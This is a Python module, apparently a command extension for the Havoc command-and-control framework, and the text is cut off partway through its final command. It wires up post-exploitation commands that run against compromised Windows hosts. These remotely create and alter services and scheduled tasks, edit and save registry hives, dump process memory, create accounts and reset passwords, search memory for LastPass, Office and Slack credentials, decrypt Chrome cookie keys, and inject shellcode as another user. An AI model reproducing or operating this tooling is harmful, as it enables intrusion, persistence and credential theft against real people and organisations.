import traceback

from pyhavoc.core  import *
from pyhavoc.ui    import *
from pyhavoc.agent import *
from os.path       import exists, dirname, basename

CURRENT_DIR  = dirname( __file__ )
CACHE_OBJECT = False

##
## this are some util functions and the RemoteOpsTaskBase
## base object which every remote ops command will inherit
##

def file_read( path: str ) -> bytes:
    handle    = open( path, 'rb' )
    obj_bytes = handle.read()
    handle.close()
    return obj_bytes


class RemoteOpsTaskBase( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.capture_output = False

        name = self.command()

        self.bof_path = f"{dirname(__file__)}/{name}/{name}.{self.agent().agent_meta()['arch']}.o"
        self.key_id   = f'obj-ro-handle.{name}'

    async def execute( self, args ):
        return await self.execute_object()

    async def execute_object( self, *args, argv: bytes = None, description = '' ):
        if exists( self.bof_path ) is False:
            self.log_error( f"object file not found: {self.bof_path}" )
            return

        #
        # execute the already loaded object file if we
        # have it loaded + CACHE_OBJECT is still enabled
        #
        if self.key_id in self.agent().key_store and CACHE_OBJECT:
            task = self.agent().object_invoke(
                self.agent().key_store[ self.key_id ],
                'go',
                *args,
                object_argv  = argv,
                flag_capture = self.capture_output
            )
        else:
            task = self.agent().object_execute(
                file_read( self.bof_path ),
                'go',
                *args,
                object_argv  = argv,
                flag_cache   = CACHE_OBJECT,
                flag_capture = self.capture_output
            )

        uuid    = format( task.task_uuid(), 'x' )
        message = description

        #
        # this displays the informational message of the task being created
        # by either using the given execute_object description or use the
        # registered command description
        #
        if len( message ) == 0:
            message = self.description()
            if CACHE_OBJECT:
                message += ' (with caching enabled)'

            task.set_description( message )

        self.log_info( f'({uuid}) {message}' )

        #
        # now invoke and issue the task to the agent and wait for it to finish
        #
        try:
            result = await task.result()

            if CACHE_OBJECT and self.key_id not in self.agent().key_store:
                #
                # looks like we are not in the store meaning that the previously send
                # out task should be caching the object into memory and return us the handle
                #
                handle, output = result
                message        = f'(handle: 0x{handle:x})'

                self.agent().key_store[ self.key_id ] = handle
            else:
                #
                # normally wait for the object file to finish!
                #
                message = ''
                handle, output = 0, ''

                if len( result ) == 1:
                    output = result
                elif len( result ) == 2:
                    handle, output = result

            if len( output ) > 0 and self.capture_output:
                self.process_output( output, task.task_uuid() )
            elif self.capture_output:
                self.log_warn( f'{self.command()} has sent no output back!', task_id = task.task_uuid() )
        except Exception as e:
            self.log_error( f"({uuid}) failed to execute {self.command()}: {e}", task_id = task.task_uuid() )
            print( traceback.format_exc() )
            if str( e ) == 'STATUS_NOT_FOUND':
                self.log_warn( f'removing key store entry of {self.command()}' )
                del self.agent().key_store[ self.key_id ]
            return

        self.log_success( f"({uuid}) successfully executed {self.command()} {message}", task_id = task.task_uuid() )

    def process_output( self, output: str, task_id: int ):
        self.log_success( f'received output from {self.command()} [{len(output)} bytes]:', task_id = task_id )
        self.log_raw( output.decode(), task_id = task_id )
        return


##
## service control commands
##

@KnRegisterCommand( command     = 'sc_description',
                    description = 'sets the description of an existing service',
                    group       = 'Remote Operations Commands' )
class ObjectScDescriptionTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Sets the description of an existing service on the target host.\n"
            "   Local system is targeted if HOSTNAME is not specified.\n"
        )

        parser.add_argument( 'SVCNAME', type=str, help='the name of the service' )
        parser.add_argument( 'DESCRIPTION', type=str, help='the description of the service' )
        parser.add_argument( 'HOSTNAME', nargs='?', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"setting description for service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zzz', args.HOSTNAME, args.SVCNAME, args.DESCRIPTION ),
            description = description
        )


@KnRegisterCommand( command     = 'sc_config',
                    description = 'configures an existing service',
                    group       = 'Remote Operations Commands' )
class ObjectScConfigTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Configures an existing service.\n\n"
            "   ERRORMODE values:\n"
            "     0 - ignore errors\n"
            "     1 - normal logging\n"
            "     2 - log severe errors\n"
            "     3 - log critical errors\n\n"
            "   STARTMODE values:\n"
            "     2 - auto start\n"
            "     3 - on demand start\n"
            "     4 - disabled\n"
        )

        parser.add_argument( 'SVCNAME', type=str, help='the name of the service' )
        parser.add_argument( 'BINPATH', type=str, help='the binary path of the service to execute' )
        parser.add_argument( 'ERRORMODE', type=int, choices=[0, 1, 2, 3], help='error mode (0-3)' )
        parser.add_argument( 'STARTMODE', type=int, choices=[2, 3, 4], help='start mode (2-4)' )
        parser.add_argument( 'HOSTNAME', nargs='?', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"configuring service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zzzss', args.HOSTNAME, args.SVCNAME, args.BINPATH, args.ERRORMODE, args.STARTMODE ),
            description = description
        )


@KnRegisterCommand( command     = 'sc_failure',
                    description = 'changes the actions upon failure',
                    group       = 'Remote Operations Commands' )
class ObjectScFailureTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   ACTIONS format: type/delay/type/delay (e.g., 3/5000/2/800)\n\n"
            "   Action types:\n"
            "     0 - No action\n"
            "     1 - Restart the service\n"
            "     2 - Reboot the computer\n"
            "     3 - Run a command\n"
        )

        parser.add_argument( 'SVCNAME', type=str, help='the name of the service' )
        parser.add_argument( 'RESETPERIOD', type=str, help='period (seconds) of no failures before reset (may be INFINITE)' )
        parser.add_argument( 'NUMACTIONS', type=int, help='number of actions to configure' )
        parser.add_argument( 'ACTIONS', type=str, help='failure actions/delays separated by /' )
        parser.add_argument( '--reboot-message', dest='REBOOTMESSAGE', default='', type=str, help='message broadcast before reboot' )
        parser.add_argument( '--command', dest='COMMAND', default='', type=str, help='command line to run on failure' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"configuring failure actions for service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        try:
            resetperiod = -1 if args.RESETPERIOD.upper() == 'INFINITE' else int( args.RESETPERIOD )
        except ValueError:
            self.log_error( f"invalid RESETPERIOD: {args.RESETPERIOD}" )
            return

        return await self.execute_object(
            argv        = bof_pack( 'zzizzsz', args.HOSTNAME, args.SVCNAME, resetperiod,
                                    args.REBOOTMESSAGE, args.COMMAND, args.NUMACTIONS, args.ACTIONS ),
            description = description
        )


@KnRegisterCommand( command     = 'sc_create',
                    description = 'creates a new service',
                    group       = 'Remote Operations Commands' )
class ObjectScCreateTask( RemoteOpsTaskBase ):

    SERVICE_TYPES = {
        1: 0x02,  # SERVICE_FILE_SYSTEM_DRIVER
        2: 0x01,  # SERVICE_KERNEL_DRIVER
        3: 0x10,  # SERVICE_WIN32_OWN_PROCESS
        4: 0x20,  # SERVICE_WIN32_SHARE_PROCESS
    }

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   ERRORMODE: 0=ignore, 1=normal, 2=severe, 3=critical\n"
            "   STARTMODE: 2=auto, 3=on demand, 4=disabled\n"
            "   TYPE: 1=filesystem driver, 2=kernel driver, 3=own process (default), 4=share process\n"
        )

        parser.add_argument( 'SVCNAME', type=str, help='the name of the service to create' )
        parser.add_argument( 'DISPLAYNAME', type=str, help='the display name of the service' )
        parser.add_argument( 'BINPATH', type=str, help='the binary path of the service' )
        parser.add_argument( 'DESCRIPTION', type=str, help='the description of the service' )
        parser.add_argument( 'ERRORMODE', type=int, choices=[0, 1, 2, 3], help='error mode (0-3)' )
        parser.add_argument( 'STARTMODE', type=int, choices=[2, 3, 4], help='start mode (2-4)' )
        parser.add_argument( '--type', dest='TYPE', default=3, type=int, choices=[1, 2, 3, 4], help='service type (default: 3)' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        servicetype = self.SERVICE_TYPES.get( args.TYPE, 0x10 )
        description = f"creating service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zzzzzsss', args.HOSTNAME, args.SVCNAME, args.BINPATH, args.DISPLAYNAME,
                                    args.DESCRIPTION, args.ERRORMODE, args.STARTMODE, servicetype ),
            description = description
        )


@KnRegisterCommand( command     = 'sc_delete',
                    description = 'deletes a service',
                    group       = 'Remote Operations Commands' )
class ObjectScDeleteTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'SVCNAME', type=str, help='the name of the service to delete' )
        parser.add_argument( 'HOSTNAME', nargs='?', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"deleting service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zz', args.HOSTNAME, args.SVCNAME ),
            description = description
        )


@KnRegisterCommand( command     = 'sc_stop',
                    description = 'stops a service',
                    group       = 'Remote Operations Commands' )
class ObjectScStopTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'SVCNAME', type=str, help='the name of the service to stop' )
        parser.add_argument( 'HOSTNAME', nargs='?', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"stopping service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zz', args.HOSTNAME, args.SVCNAME ),
            description = description
        )


@KnRegisterCommand( command     = 'sc_start',
                    description = 'starts a service',
                    group       = 'Remote Operations Commands' )
class ObjectScStartTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'SVCNAME', type=str, help='the name of the service to start' )
        parser.add_argument( 'HOSTNAME', nargs='?', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"starting service '{args.SVCNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zz', args.HOSTNAME, args.SVCNAME ),
            description = description
        )


##
## registry commands
##

@KnRegisterCommand( command     = 'reg_set',
                    description = 'creates or sets a registry key or value',
                    group       = 'Remote Operations Commands' )
class ObjectRegSetTask( RemoteOpsTaskBase ):

    REG_HIVES = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU':  3,
    }

    REG_TYPES = {
        'REG_SZ':        1,
        'REG_EXPAND_SZ': 2,
        'REG_BINARY':    3,
        'REG_DWORD':     4,
        'REG_MULTI_SZ':  7,
        'REG_QWORD':     11,
    }

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   HIVE: HKLM, HKCU, HKU, HKCR\n"
            "   TYPE: REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD\n\n"
            "   Note: For REG_BINARY, DATA must be a file path.\n"
            "         For REG_MULTI_SZ, DATA should be space-separated values.\n"
            "         Use \"\" for VALUE to set the default key.\n"
        )

        parser.add_argument( 'HIVE', type=str, choices=['HKLM', 'HKCU', 'HKU', 'HKCR'], help='registry hive' )
        parser.add_argument( 'KEY', type=str, help='registry path' )
        parser.add_argument( 'VALUE', type=str, help='value name (use "" for default)' )
        parser.add_argument( 'TYPE', type=str, choices=['REG_SZ', 'REG_EXPAND_SZ', 'REG_BINARY', 'REG_DWORD', 'REG_MULTI_SZ', 'REG_QWORD'], help='registry value type' )
        parser.add_argument( 'DATA', type=str, nargs='+', help='data to store' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        hostname = f"\\\\{args.HOSTNAME}" if args.HOSTNAME else ''
        hive = self.REG_HIVES[ args.HIVE ]
        regtype = self.REG_TYPES[ args.TYPE ]

        if args.TYPE in ['REG_DWORD', 'REG_QWORD']:
            data = int( args.DATA[0] ).to_bytes( 4 if args.TYPE == 'REG_DWORD' else 8, 'little' )
            packstr = 'zizzib'
        elif args.TYPE == 'REG_MULTI_SZ':
            data = b''.join( s.encode('utf-16-le') + b'\x00\x00' for s in args.DATA ) + b'\x00\x00'
            packstr = 'zizzib'
        elif args.TYPE == 'REG_BINARY':
            if not exists( args.DATA[0] ):
                self.log_error( f"binary file not found: {args.DATA[0]}" )
                return
            data = file_read( args.DATA[0] )
            packstr = 'zizzib'
        else:
            data = args.DATA[0]
            packstr = 'zizziz'

        description = f"setting registry value '{args.VALUE}' in {args.HIVE}\\{args.KEY}"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( packstr, hostname, hive, args.KEY, args.VALUE, regtype, data ),
            description = description
        )


@KnRegisterCommand( command     = 'reg_delete',
                    description = 'deletes a registry key or value',
                    group       = 'Remote Operations Commands' )
class ObjectRegDeleteTask( RemoteOpsTaskBase ):

    REG_HIVES = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU':  3,
    }

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Deletes the specified registry key or value.\n"
            "   If REGVALUE is omitted, the entire key is deleted.\n"
            "   Use \"\" for REGVALUE to delete the default key.\n"
        )

        parser.add_argument( 'HIVE', type=str, choices=['HKLM', 'HKCU', 'HKU', 'HKCR'], help='registry hive' )
        parser.add_argument( 'REGPATH', type=str, help='registry path' )
        parser.add_argument( 'REGVALUE', nargs='?', default=None, type=str, help='registry value to delete (default: delete key)' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        hostname = f"\\\\{args.HOSTNAME}" if args.HOSTNAME else ''
        hive = self.REG_HIVES[ args.HIVE ]

        if args.REGVALUE is None:
            delkey = 1
            key = ''
        else:
            delkey = 0
            key = args.REGVALUE

        description = f"deleting registry {'key' if delkey else 'value'} at {args.HIVE}\\{args.REGPATH}"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'zizzi', hostname, hive, args.REGPATH, key, delkey ),
            description = description
        )


@KnRegisterCommand( command     = 'reg_save',
                    description = 'saves the registry path and all subkeys to disk',
                    group       = 'Remote Operations Commands' )
class ObjectRegSaveTask( RemoteOpsTaskBase ):

    REG_HIVES = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU':  3,
    }

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Saves the specified registry path and all subkeys to a file on target.\n"
            "   Note: The FILEOUT is saved to disk on target, don't forget to clean up.\n"
        )

        parser.add_argument( 'HIVE', type=str, choices=['HKLM', 'HKCU', 'HKU', 'HKCR'], help='registry hive' )
        parser.add_argument( 'REGPATH', type=str, help='registry path to save' )
        parser.add_argument( 'FILEOUT', type=str, help='output file path on target' )

    async def execute( self, args ):
        hive = self.REG_HIVES[ args.HIVE ]

        self.log_info( 'requesting SeBackupPrivilege' )

        return await self.execute_object(
            argv        = bof_pack( 'zzi', args.REGPATH, args.FILEOUT, hive ),
            description = f"saving registry {args.HIVE}\\{args.REGPATH} to {args.FILEOUT}"
        )


##
## scheduled task commands
##

@KnRegisterCommand( command     = 'schtaskscreate',
                    description = 'creates a new scheduled task',
                    group       = 'Remote Operations Commands' )
class ObjectSchtasksCreateTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   USERMODE: USER, SYSTEM, XML, PASSWORD\n"
            "   FORCEMODE: CREATE (fail if exists), UPDATE (update existing)\n\n"
            "   Note: XMLFILE is the local path to the XML task definition file.\n"
            "         Use --username/--password for PASSWORD mode or leave empty for current user.\n"
        )

        parser.add_argument( 'TASKPATH', type=str, help='path for the created task' )
        parser.add_argument( 'USERMODE', type=str, choices=['USER', 'SYSTEM', 'XML', 'PASSWORD'], help='user mode' )
        parser.add_argument( 'FORCEMODE', type=str, choices=['CREATE', 'UPDATE'], help='creation disposition' )
        parser.add_argument( 'XMLFILE', type=str, help='local path to XML task definition file' )
        parser.add_argument( '--username', dest='USERNAME', default='', type=str, help='username for the task' )
        parser.add_argument( '--password', dest='PASSWORD', default='', type=str, help='password for the user' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        mode_map = { 'USER': 0, 'SYSTEM': 1, 'XML': 2, 'PASSWORD': 3 }
        force_map = { 'CREATE': 0, 'UPDATE': 1 }

        mode = mode_map[ args.USERMODE ]
        force = force_map[ args.FORCEMODE ]

        if not exists( args.XMLFILE ):
            self.log_error( f"XML file not found: {args.XMLFILE}" )
            return

        xmldata = file_read( args.XMLFILE ).decode( 'utf-8' )

        description = f"creating scheduled task '{args.TASKPATH}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZZZZii', args.HOSTNAME, args.USERNAME, args.PASSWORD, args.TASKPATH, xmldata, mode, force ),
            description = description
        )


@KnRegisterCommand( command     = 'schtasksdelete',
                    description = 'deletes a scheduled task or folder',
                    group       = 'Remote Operations Commands' )
class ObjectSchtasksDeleteTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   TYPE: TASK or FOLDER\n"
            "   Note: Folders must be empty before deletion.\n"
            "         Full path including task name must be given.\n"
        )

        parser.add_argument( 'TASKNAME', type=str, help='task or folder name' )
        parser.add_argument( 'TYPE', type=str, choices=['TASK', 'FOLDER'], help='type of target to delete' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        isfolder = 1 if args.TYPE == 'FOLDER' else 0
        description = f"deleting scheduled {args.TYPE.lower()} '{args.TASKNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZi', args.HOSTNAME, args.TASKNAME, isfolder ),
            description = description
        )


@KnRegisterCommand( command     = 'schtasksstop',
                    description = 'stops a scheduled task',
                    group       = 'Remote Operations Commands' )
class ObjectSchtasksStopTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Note: Full path including task name must be given.\n"
            "   Example: schtasksstop \\\\Microsoft\\\\Windows\\\\MUI\\\\LpRemove\n"
        )

        parser.add_argument( 'TASKNAME', type=str, help='scheduled task name (full path)' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"stopping scheduled task '{args.TASKNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZ', args.HOSTNAME, args.TASKNAME ),
            description = description
        )


@KnRegisterCommand( command     = 'schtasksrun',
                    description = 'run a scheduled task',
                    group       = 'Remote Operations Commands' )
class ObjectSchtasksRunTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Note: Full path including task name must be given.\n"
        )

        parser.add_argument( 'TASKNAME', type=str, help='scheduled task name (full path)' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: local)' )

    async def execute( self, args ):
        description = f"running scheduled task '{args.TASKNAME}'"
        if args.HOSTNAME:
            description += f" on host '{args.HOSTNAME}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZ', args.HOSTNAME, args.TASKNAME ),
            description = description
        )


##
## process commands
##

@KnRegisterCommand( command     = 'procdump',
                    description = 'dumps the specified process to output file',
                    group       = 'Remote Operations Commands' )
class ObjectProcdumpTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Dumps a process using MiniDumpWriteDump.\n"
            "   Warning: This command may get caught by security software.\n"
        )

        parser.add_argument( 'PID', type=int, help='process ID to dump' )
        parser.add_argument( 'FILEOUT', type=str, help='output path to write the dump' )

    async def execute( self, args ):
        self.log_info( 'requesting SeDebugPrivilege' )

        return await self.execute_object(
            argv        = bof_pack( 'iZ', args.PID, args.FILEOUT ),
            description = f"dumping process {args.PID} to {args.FILEOUT}"
        )


@KnRegisterCommand( command     = 'ProcessListHandles',
                    description = 'lists open handles in process',
                    group       = 'Remote Operations Commands' )
class ObjectProcessListHandlesTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'PID', type=int, help='process ID to list handles of' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'i', args.PID ),
            description = f"listing handles in process {args.PID}"
        )


@KnRegisterCommand( command     = 'ProcessDestroy',
                    description = 'closes handle(s) in a process',
                    group       = 'Remote Operations Commands' )
class ObjectProcessDestroyTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Closes specified handle or all handles if HANDLEID is not specified.\n"
            "   HANDLEID must be between 1-65535.\n"
        )

        parser.add_argument( 'PID', type=int, help='process ID' )
        parser.add_argument( 'HANDLEID', nargs='?', default=0, type=int, help='handle ID (1-65535) or all if not specified' )

    async def execute( self, args ):
        if args.HANDLEID < 0 or args.HANDLEID > 65535:
            self.log_error( 'invalid HANDLEID: must be between 0-65535' )
            return

        description = f"closing {'all handles' if args.HANDLEID == 0 else f'handle {args.HANDLEID}'} in process {args.PID}"

        return await self.execute_object(
            argv        = bof_pack( 'ii', args.PID, args.HANDLEID ),
            description = description
        )


@KnRegisterCommand( command     = 'suspend',
                    description = 'suspend a process by PID',
                    group       = 'Remote Operations Commands' )
class ObjectSuspendTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'PID', type=int, help='process ID to suspend' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'si', 1, args.PID ),
            description = f"suspending process {args.PID}"
        )


@KnRegisterCommand( command     = 'resume',
                    description = 'resume a process by PID',
                    group       = 'Remote Operations Commands' )
class ObjectResumeTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'PID', type=int, help='process ID to resume' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'si', 0, args.PID ),
            description = f"resuming process {args.PID}"
        )


##
## user account commands
##

@KnRegisterCommand( command     = 'enableuser',
                    description = 'enables and unlocks the specified user account',
                    group       = 'Remote Operations Commands' )
class ObjectEnableUserTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Activates and enables the specified user account.\n"
            "   Omit DOMAIN to target local machine.\n"
        )

        parser.add_argument( 'USERNAME', type=str, help='user name to activate/enable' )
        parser.add_argument( 'DOMAIN', nargs='?', default='', type=str, help='domain/computer (default: local)' )

    async def execute( self, args ):
        description = f"enabling user '{args.USERNAME}'"
        if args.DOMAIN:
            description += f" in domain '{args.DOMAIN}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZ', args.DOMAIN, args.USERNAME ),
            description = description
        )


@KnRegisterCommand( command     = 'setuserpass',
                    description = 'sets the specified user\'s password',
                    group       = 'Remote Operations Commands' )
class ObjectSetUserPassTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Sets the password for the specified user account.\n"
            "   Password must meet GPO requirements.\n"
            "   Omit DOMAIN to target local machine.\n"
        )

        parser.add_argument( 'USERNAME', type=str, help='user name' )
        parser.add_argument( 'PASSWORD', type=str, help='new password' )
        parser.add_argument( 'DOMAIN', nargs='?', default='', type=str, help='domain/computer (default: local)' )

    async def execute( self, args ):
        description = f"setting password for user '{args.USERNAME}'"
        if args.DOMAIN:
            description += f" in domain '{args.DOMAIN}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZZ', args.DOMAIN, args.USERNAME, args.PASSWORD ),
            description = description
        )


@KnRegisterCommand( command     = 'addusertogroup',
                    description = 'add user to group (domain groups only)',
                    group       = 'Remote Operations Commands' )
class ObjectAddUserToGroupTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Adds the specified user to a domain group.\n"
            "   Omit SERVER/DOMAIN to target local machine.\n"
        )

        parser.add_argument( 'USERNAME', type=str, help='user name to add' )
        parser.add_argument( 'GROUPNAME', type=str, help='group to add the user to' )
        parser.add_argument( 'SERVER', nargs='?', default='', type=str, help='target server (default: local)' )
        parser.add_argument( 'DOMAIN', nargs='?', default='', type=str, help='domain for the account (default: local)' )

    async def execute( self, args ):
        description = f"adding user '{args.USERNAME}' to group '{args.GROUPNAME}'"
        if args.SERVER:
            description += f" on server '{args.SERVER}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZZZ', args.DOMAIN, args.SERVER, args.USERNAME, args.GROUPNAME ),
            description = description
        )


@KnRegisterCommand( command     = 'adduser',
                    description = 'add a new user to a machine',
                    group       = 'Remote Operations Commands' )
class ObjectAddUserTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Creates a new user on the specified machine.\n"
            "   If SERVER is omitted, the local machine is used.\n"
        )

        parser.add_argument( 'USERNAME', type=str, help='name of the new user' )
        parser.add_argument( 'PASSWORD', type=str, help='password of the new user' )
        parser.add_argument( 'SERVER', nargs='?', default='', type=str, help='target server (default: local)' )

    async def execute( self, args ):
        description = f"creating user '{args.USERNAME}'"
        if args.SERVER:
            description += f" on server '{args.SERVER}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZZ', args.USERNAME, args.PASSWORD, args.SERVER ),
            description = description
        )


@KnRegisterCommand( command     = 'unexpireuser',
                    description = 'unexpires the specified user account',
                    group       = 'Remote Operations Commands' )
class ObjectUnexpireUserTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Removes expiration from the specified user account.\n"
            "   Omit DOMAIN to target local machine.\n"
        )

        parser.add_argument( 'USERNAME', type=str, help='user name' )
        parser.add_argument( 'DOMAIN', nargs='?', default='', type=str, help='domain/computer (default: local)' )

    async def execute( self, args ):
        description = f"unexpiring user '{args.USERNAME}'"
        if args.DOMAIN:
            description += f" in domain '{args.DOMAIN}'"

        return await self.execute_object(
            argv        = bof_pack( 'ZZ', args.DOMAIN, args.USERNAME ),
            description = description
        )


##
## credential/key commands
##

@KnRegisterCommand( command     = 'chromeKey',
                    description = 'decrypts the Chrome encryption key',
                    group       = 'Remote Operations Commands' )
class ObjectChromeKeyTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Decrypts the base64 encoded Chrome key for cookie decryption.\n"
            "   Can be used with Chlonium to decrypt Chrome/Edge cookies.\n"
            "   Cookie path example:\n"
            "     C:\\Users\\user\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies\n"
        )


@KnRegisterCommand( command     = 'slackKey',
                    description = 'decrypts the Slack encryption key',
                    group       = 'Remote Operations Commands' )
class ObjectSlackKeyTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Decrypts the base64 encoded Slack key for cookie decryption.\n"
            "   Cookie path example:\n"
            "     C:\\Users\\user\\AppData\\Roaming\\Slack\\Network\\Cookies\n"
        )


@KnRegisterCommand( command     = 'office_tokens',
                    description = 'searches memory for Office JWT Access Tokens',
                    group       = 'Remote Operations Commands' )
class ObjectOfficeTokensTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'PID', type=int, help='process ID to search' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'i', args.PID ),
            description = f"searching for Office tokens in process {args.PID}"
        )


@KnRegisterCommand( command     = 'lastpass',
                    description = 'searches memory for LastPass passwords and hashes',
                    group       = 'Remote Operations Commands' )
class ObjectLastpassTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'PIDS', type=int, nargs='+', help='process IDs to search' )

    async def execute( self, args ):
        pid_data = b''.join( pid.to_bytes( 4, 'little' ) for pid in args.PIDS ) + b'\x00\x00\x00\x00'

        return await self.execute_object(
            argv        = bof_pack( 'ib', len(args.PIDS), pid_data ),
            description = f"searching for LastPass credentials in {len(args.PIDS)} process(es)"
        )


@KnRegisterCommand( command     = 'slack_cookie',
                    description = 'searches memory for Slack tokens',
                    group       = 'Remote Operations Commands' )
class ObjectSlackCookieTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'PID', type=int, help='process ID to search' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'i', args.PID ),
            description = f"searching for Slack tokens in process {args.PID}"
        )


##
## spawn/injection commands
##

@KnRegisterCommand( command     = 'shspawnas',
                    description = 'spawn/inject as specified user',
                    group       = 'Remote Operations Commands' )
class ObjectShspawnasTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Spawns a process as the specified user and injects shellcode.\n"
            "   Omit DOMAIN to log into the local machine.\n"
            "   Note: User must be able to log in interactively; login is recorded.\n"
        )

        parser.add_argument( 'USERNAME', type=str, help='username' )
        parser.add_argument( 'PASSWORD', type=str, help='password' )
        parser.add_argument( 'SHELLCODEFILE', type=str, help='path to shellcode file' )
        parser.add_argument( 'DOMAIN', nargs='?', default='', type=str, help='domain (default: local)' )

    async def execute( self, args ):
        if not exists( args.SHELLCODEFILE ):
            self.log_error( f"shellcode file not found: {args.SHELLCODEFILE}" )
            return

        shellcode = file_read( args.SHELLCODEFILE )

        return await self.execute_object(
            argv        = bof_pack( 'ZZZb', args.DOMAIN, args.USERNAME, args.PASSWORD, shellcode ),
